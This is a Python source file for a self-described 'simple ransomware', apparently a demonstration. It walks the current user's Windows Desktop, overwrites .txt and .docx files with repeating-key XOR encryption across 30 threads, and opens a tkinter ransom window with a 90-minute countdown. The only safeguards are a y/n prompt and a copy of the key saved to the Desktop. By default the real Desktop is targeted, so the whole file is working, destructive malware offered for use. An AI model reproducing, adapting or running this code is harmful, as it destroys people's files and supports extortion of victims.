# Simple Python ransomware
import os
import random
from threading import Thread
from queue import Queue
import getpass
import string
import tkinter as tk



#setting up a safeguard to avoid running the code in the host machine
extend = "\\"
pc_username = getpass.getuser()
desktop_path = "C:\\Users\\"+pc_username+"\\Desktop"
decrypt_key = "decrypt_key.txt"
safeguard = input("Are you sure you want to run this program ? y/n \n")
if safeguard != 'y':
    quit()

#Enumeraing the types pf files to be encrypted
#you can add as many extension as you want here
Extension_to_be_encrypted = ('.txt','.docx' , ) 

#Grab all the files with the required extension
file_lists_paths = []
for root, dirs, files in os.walk("C:\\Users\\"+pc_username+"\\Desktop") : # Change this directory to the test folder path you will create
    for file in files :
        file_path, file_ext = os.path.splitext(root+extend+file) #this separates the name and the extension
        if file_ext in Extension_to_be_encrypted :
            file_lists_paths.append(root+extend+file)
            
# for f in file_lists_paths:
#      print(f)

# Creating a pool of all exixting characters
low = string.ascii_lowercase
upp = string.ascii_uppercase
dig = string.digits
special_char = string.punctuation

combined_characters = low + upp + dig + special_char

#Generate a key to ecnrypt from existing pool of characters
key = ""
encryption_level = 128 // 8     #this is how many bytes the encryption level is, it can be increased according to the lenght of desired encryption key 
char_pool = []                  #character from which the key can be made of
for i in (combined_characters) :  #All possible character
    char_pool.append(i)
for i in range(encryption_level) :
    key += random.choice(char_pool) #The final result is the actual key for encryption

#The decryption key will be on the Desktop only for demonstration purpose
with open(desktop_path + extend + decrypt_key , "w", encoding="utf-8") as f:
    f.write(key)

print(key)

#encrypting the files with encrypt function
def encrypt(key):
    while q.not_empty :
        file = q.get()
        index = 0
        maximum_index = encryption_level - 1
        try :
            with open(file,"rb") as f : # read each file in binary mode
                data = f.read()
            with open(file,"wb") as f :
                for byte in data : # rewriting the bytes using XOR operation 
                    xor_byte = byte ^ ord(key[index]) #ord grabs the ASCII value of the character
                    f.write(xor_byte.to_bytes(1 ,"little"))
                    if index >= maximum_index :
                        index = 0
                    else :
                        index += 1
        except:
            print(f'Failed to encrypt the {file}')
        q.task_done()

q = Queue() #special list that can help in multi-threading that helps speeding up the process of encryption
for file in file_lists_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon = True)
    thread.start()

q.join()
print("Encryption Successful")

#this is responsible for the popup message when ransom.py is run
def countdown(count):
    h, m, s = count.split(':')
    h = int(h)  #hours
    m = int(m)  #minutes
    s = int(s)  #seconds

    label['text'] = '{}:{}:{}'.format(h, m, s)

    if s > 0 or m > 0 or h > 0:
        # call countdown again after 1000ms (1s)
        if s > 0:
            s -= 1
        elif m > 0:
            m -= 1
            s = 59
        elif h > 0:
            h -= 1
            m = 59
            s = 59
        root.after(1000, countdown, '{}:{}:{}'.format(h, m, s))

root = tk.Tk()
root.title('Python_Ransomware')
root.geometry('500x300')
root.resizable(False, False)
label1 = tk.Label(root, text='Your data has been abducted by Python_Ransomware\n\n'
                             'WARNING: THERE IS NO SECOND ATTEMPT TO ENTER THE CORRECT KEY \n\n IF IT IS WRONG YOU LOSE YOUR FILES FOREVER', font=('calibri', 12,'bold'))
label1.pack()
label = tk.Label(root,font=('calibri', 50,'bold'), fg='red', bg='blue')
label.pack()

# call countdown first time
countdown('01:30:00')
# root.after(0, countdown, 5)
root.mainloop()

# print(hostname)




